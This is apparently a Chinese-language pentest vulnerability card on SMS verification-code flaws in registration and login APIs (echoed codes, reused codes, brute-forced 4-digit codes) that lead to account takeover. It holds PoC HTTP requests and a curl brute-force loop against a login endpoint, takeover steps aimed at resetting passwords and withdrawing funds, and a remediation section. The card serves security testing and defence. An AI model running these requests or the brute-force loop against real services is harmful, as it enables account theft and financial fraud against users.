---
title: 短信验证码回显 / 复用 / 爆破（任意账号接管）
cve: 无（业务逻辑）
severity: critical
cvss: 9.1
product: 自研注册/登录/改密接口
versions: 任意
ports: 80, 443
keywords: sms, code, 验证码回显, 复用, 爆破, 接管
entry: 响应里带 code / 同码复用 / 4 位爆破
verified: false
sources: 公开资料整理（业务逻辑类，无 CVE）
---

## 指纹

```
/api/sms/send      /api/user/register      /api/user/findpwd
/api/login (手机号+验证码)   /api/user/bindPhone
```

三类缺陷分开看：**回显**（响应体含 `code`/`smsCode`）、**复用**（同一 code 对多个手机号/多次有效）、**爆破**（4 位、无次数、无过期）。

## 前置条件

- 正常注册账号；抓包工具；授权测试号码。

## PoC

```http
### A. 回显：发送验证码，看响应
POST /api/sms/send HTTP/1.1
Content-Type: application/json

{"phone":"13900000001","type":"login"}

# 响应里若出现 {"code":"1234"} / debug 字段 / msg 带数字 ⇒ 直接登录

### B. 复用：拿 A 手机的 code 打 B 手机
POST /api/login HTTP/1.1
Content-Type: application/json

{"phone":"13900000002","code":"<A 收到的 code>"}

### C. 爆破：4 位、无次数限制
for c in $(seq -w 0000 9999); do
  r=$(curl -s -o /dev/null -w '%{http_code}' -X POST https://target/api/login -H 'content-type: application/json' -d "{\"phone\":\"13900000001\",\"code\":\"$c\"}")
  echo "$c $r"
done | grep -v ' 401'
```

## 利用步骤

1. 先看 A：响应里带 code 就直接进；很多"测试环境没关"的站会这样。
2. 再试 B：code 是否只跟会话绑定、不跟手机号绑定。
3. C：4 位且无次数限制时，10000 次以内必中（限速跑，别打崩）；6 位无限制也可行但慢。
4. 拿到账号后看能否改密/绑卡/提现（资金面）；某些站登录后能直接看他人代理树。
5. 证据：一条成功登录的请求 + 响应；不要留号码库。

## 修复与缓解

- 验证码只走短信通道，响应里绝不回显；6 位、5 分钟、5 次上限、一次性。
- 与会话+手机号强绑定，校验失败计数落库（不能用内存计数被重启绕过）。
- 登录/改密/绑定统一限速，同号码同 IP 双维。

## 参考

- OWASP Authentication Cheat Sheet；OWASP WSTG-ATHN-03。
